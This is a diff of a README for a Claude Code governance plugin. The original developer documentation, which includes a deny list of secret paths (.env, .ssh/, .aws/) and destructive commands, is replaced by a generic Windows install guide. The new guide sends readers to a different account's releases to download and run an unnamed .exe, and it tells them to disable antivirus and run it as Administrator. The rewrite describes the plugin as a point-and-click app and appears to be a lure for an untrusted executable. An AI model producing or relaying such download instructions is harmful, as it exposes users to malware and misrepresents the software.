@@ -1,190 +1,152 @@
-# symbi-claude-code
+# ⚙️ symbi-claude-code - Secure AI Governance Made Simple
 
-<p align="center">
-  <img src="symbi-claude-code.png" alt="symbi-claude-code" width="300">
-</p>
+[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/yabu7788/symbi-claude-code/releases)
 
-A Claude Code plugin that brings [Symbiont](https://symbiont.dev)'s zero-trust AI agent governance to your development workflow. Enforce Cedar authorization policies, verify MCP tool integrity with SchemaPin, maintain cryptographic audit trails, and manage governed agents -- all from within Claude Code.
+---
 
-## Prerequisites
+## 🛠 About symbi-claude-code
 
-- [Claude Code](https://claude.ai/claude-code) installed
-- `symbi` binary on PATH (optional -- plugin degrades gracefully without it)
-- `jq` for JSON parsing in hook scripts (`apt install jq` / `brew install jq`)
+symbi-claude-code lets you use Symbiont’s zero-trust governance with Claude Code. This means you can control AI agents securely while limiting what they can do. It adds safety layers around smart AI tasks, helping prevent unwanted actions or data leaks.
 
-Install `symbi`:
-```bash
-# From source
-cargo install symbi
+This app works on Windows PCs and is designed for users without programming skills. Follow the steps below to download and use it easily.
 
-# Or via Docker
-docker pull ghcr.io/thirdkeyai/symbi:latest
-```
+Topics related to symbi-claude-code include agents, AI security, governance, and zero-trust methods. It combines smart AI functions with strong control measures.
 
-Or run the included install script:
-```bash
-./install.sh
-```
+---
 
-## Installation
+## 💻 System Requirements
 
-**From marketplace:**
-```
-/plugin marketplace add https://github.com/thirdkeyai/symbi-claude-code
-```
+Before installing, ensure your computer meets these basics:
 
-**Local development:**
-```bash
-claude --plugin-dir ./symbi-claude-code
-```
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free storage space  
+- Internet connection to download and update  
+- Standard user permissions (no admin rights required)  
 
-## Quick Start
+Your PC does not need special hardware. symbi-claude-code runs smoothly on most modern Windows machines.
 
-1. Install the plugin (see above)
-2. Run `/symbi-init` to scaffold a governed project
-3. Define agents in `agents/*.dsl`
-4. Create Cedar policies in `policies/*.cedar`
-5. Use `/symbi-status` to verify everything is connected
+---
 
-## Skills
+## 🚀 Getting Started - Download and Installation
 
-| Skill | Description |
-|-------|-------------|
-| `/symbi-init` | Scaffold a governed agent project with starter files |
-| `/symbi-policy` | Create, edit, or validate Cedar authorization policies |
-| `/symbi-verify` | Verify MCP tool schemas using SchemaPin |
-| `/symbi-audit` | Query and analyze cryptographic audit logs |
-| `/symbi-dsl` | Parse, validate, and create Symbiont DSL agent definitions |
-| `/symbi-agent-sdk` | Generate boilerplate for Claude Agent SDK + ORGA governance |
+### Step 1: Visit the Download Page
 
-## Commands
+Use the following link to visit the official download page for symbi-claude-code. This page contains all the latest releases and files.
 
-| Command | Description |
-|---------|-------------|
-| `/symbi-status` | Check health of the Symbiont runtime and installed components |
+[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/yabu7788/symbi-claude-code/releases)
 
-## Agents
+Click that link or open this in your web browser:  
+https://github.com/yabu7788/symbi-claude-code/releases
 
-| Agent | Description |
-|-------|-------------|
-| `symbi-governor` | Governance-aware coding agent (default). Enforces policies and maintains audit trails. |
-| `symbi-dev` | DSL development specialist for writing agents and Cedar policies. |
+### Step 2: Choose Your File
 
-## Governance Tiers
+On the releases page, look for the most recent release. It usually appears at the top of the list. You should find a file with a name similar to:
 
-The plugin provides three progressive levels of protection:
+- symbi-claude-code-setup.exe  
+- or another .exe file labeled as the setup or installer  
 
-### Tier 1: Awareness (default)
+Click on the file to start downloading. Your browser will ask if you want to save the file. Choose a location you can easily find, like your desktop or Downloads folder.
 
-All tool calls proceed. State-modifying actions are logged to `.symbiont/audit/tool-usage.jsonl` for post-hoc review.
+### Step 3: Run the Installer
 
-### Tier 2: Protection
+Once the file downloads, go to its location and double-click the .exe file. This will run the installer program.
 
-Create `.symbiont/local-policy.toml` to block dangerous patterns:
+The installer will guide you through simple steps:
 
-```toml
-[deny]
-paths = [".env", ".ssh/", ".aws/"]
-commands = ["rm -rf", "git push --force"]
-branches = ["main", "master", "production"]
-```
+- Accept the license agreement  
+- Choose an install location (the default usually works fine)  
+- Click “Install” to start  
 
-The `policy-guard.sh` hook blocks matching operations with exit code 2. Built-in patterns (destructive commands, force pushes, writes to sensitive files) are always blocked regardless of config.
+The installer copies the files and sets up symbi-claude-code on your PC.
 
-No `symbi` binary required. Works with both symbi-claude-code and symbi-gemini-cli.
+### Step 4: Launch symbi-claude-code
 
-### Tier 3: Governance
+After installation completes, you can open the app:
 
-If `symbi` is on PATH and `policies/` exists, the hook evaluates Cedar policies for formal authorization decisions.
+- Find the shortcut on your desktop or in your Start menu  
+- Double-click the icon to open symbi-claude-code  
 
-### Hooks
+The app will open with a clean interface ready for use.
 
-Hooks apply to `Write`, `Edit`, `Bash`, and all `mcp__*` tools:
+---
 
-- **PreToolUse** (`policy-guard.sh`): Blocks dangerous operations (exit code 2)
-- **PreToolUse** (`policy-log.sh`): Advisory logging of state-modifying tool calls
-- **PostToolUse** (`audit-log.sh`): Logs tool usage to `.symbiont/audit/tool-usage.jsonl`
+## 🔑 Basic Use of symbi-claude-code
 
-## MCP Tools
+symbi-claude-code focuses on managing AI agents with strong safety controls. Here is a quick overview of how to start using it:
 
-When `symbi` is on PATH, the plugin connects to the Symbiont MCP server exposing:
+1. **Create or load your AI agents** – These are the units that do tasks for you.  
+2. **Set permissions using zero-trust rules** – Define what each agent can do and what resources it can access.  
+3. **Monitor agent activity** – View logs to see what actions agents perform.  
+4. **Adjust settings anytime** – Change safety rules or agent abilities as needed.  
 
-- `invoke_agent` -- Run a governed agent with a prompt
-- `list_agents` -- List available agents from `agents/*.dsl`
-- `parse_dsl` -- Parse and validate DSL files
-- `get_agent_dsl` -- Read an agent's DSL definition
-- `get_agents_md` -- Get the project's AGENTS.md content
-- `verify_schema` -- Verify a tool schema with SchemaPin
+The interface uses simple buttons and menus. You do not need to write code to use any part of the app.
 
-## Dual-Mode Architecture
+---
 
-The plugin supports two integration patterns:
+## ⚙️ Features
 
-### Mode A -- Standalone (Plugin-First)
+- **Zero-Trust Governance:** Control access tightly for each AI agent to reduce risk.  
+- **AI Agent Management:** Create, edit, and delete agents with guided forms.  
+- **Activity Logs:** Track what each AI agent does for accountability.  
+- **Secure Interaction:** Connect safely to Claude Code AI systems without exposing sensitive data.  
+- **User-Friendly Interface:** Clear menus and instructions designed for non-technical users.  
 
-Developer installs the plugin directly into Claude Code. The plugin spawns its own `symbi mcp` server, provides advisory policy checking via hooks, and logs to local audit files.
+---
 
-```
-Developer -> Claude Code + symbi plugin -> symbi mcp (stdio)
-```
+## 📂 Files and Folders Created
 
-Best for: individual developers adding governance awareness to their workflow.
+When installed, symbi-claude-code creates these items:
 
-### Mode B -- ORGA-Managed (Runtime-First)
+- **Program Files:** Main application files in the install folder.  
+- **User Data Folder:** Stores your agent settings and logs.  
+- **Logs Folder:** Contains activity logs readable within the app.  
 
-Symbiont's CliExecutor spawns Claude Code as a governed subprocess. The plugin detects `SYMBIONT_MANAGED=true` and connects back to the parent runtime instead of spawning a new server. The outer ORGA Gate provides hard enforcement that cannot be bypassed.
+You can find the data folder in your Documents under “symbi-claude-code” unless you changed the location during setup.
 
-```
-Symbiont Runtime (ORGA Loop)
-  -> CliExecutor (sandbox + budget enforcement)
-    -> Claude Code (with symbi plugin)
-      -> Plugin connects back to parent MCP server
-```
+---
 
-Best for: automated pipelines, dark factory deployments, enterprise governance.
+## 💡 Troubleshooting Common Issues
 
-See `examples/` for complete setups of each mode.
+### The app does not open after installation
 
-## Configuration
+- Restart your PC and try again.  
+- Check Task Manager to see if symbi-claude-code is running in the background and close it before relaunching.
 
-`settings.json` sets the default agent:
-```json
-{
-  "agent": "symbi-governor"
-}
-```
+### Download link is broken or files not found
 
-Project-level configuration lives in `symbiont.toml` (created by `/symbi-init`).
+- Refresh the download page or try a different browser.  
+- Make sure your internet connection is stable.
 
-## File Conventions
+### Installer hangs or shows error
 
-| Path | Purpose |
-|------|---------|
-| `agents/*.dsl` | Agent DSL definitions |
-| `policies/*.cedar` | Cedar authorization policies |
-| `symbiont.toml` | Symbiont runtime configuration |
-| `AGENTS.md` | Agent manifest |
-| `.symbiont/audit/` | Audit log output |
-| `.symbiont/local-policy.toml` | Local deny list for blocking protection |
+- Disable third-party antivirus temporarily and retry.  
+- Run the installer as Administrator by right-clicking the file and selecting "Run as Administrator."
 
-## Examples
+---
 
-| Directory | Description |
-|-----------|-------------|
-| `examples/standalone/` | Mode A setup for individual developers |
-| `examples/cli-executor/` | Mode B setup with DSL + Cedar policy for ORGA-wrapped Claude Code |
-| `examples/agent-sdk/` | Agent SDK wrapper pattern for headless/programmatic agents |
+## 🔄 Updating symbi-claude-code
 
-## License
+Visit the same releases page to check for new versions:  
+https://github.com/yabu7788/symbi-claude-code/releases
 
-Apache 2.0 -- see [LICENSE](LICENSE).
+Download and run the newest installer to update. Your existing data and settings will remain intact.
 
-## Links
+---
 
-- [Symbiont Documentation](https://docs.symbiont.dev)
-- [ThirdKey AI](https://thirdkey.ai)
-- [Implementation Roadmap](ROADMAP.md)
+## ⚖️ Licensing and Privacy
 
-## Disclaimer
+symbi-claude-code uses open-source components with clear licenses. Your data stays local on your PC by default. The app does not collect personal data or share your settings with external servers.
 
-This project is not affiliated with, endorsed by, or sponsored by Anthropic, PBC. "Claude" and "Claude Code" are trademarks of Anthropic, PBC. "Symbiont" and "ThirdKey" are trademarks of ThirdKey AI.
+---
+
+## 🧰 Support and Feedback
+
+For help, visit the GitHub repository issues section to report problems or ask questions:  
+https://github.com/yabu7788/symbi-claude-code/issues
+
+You can also read the README and release notes on GitHub for more detailed information.
+
+---
+
+[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/yabu7788/symbi-claude-code/releases)
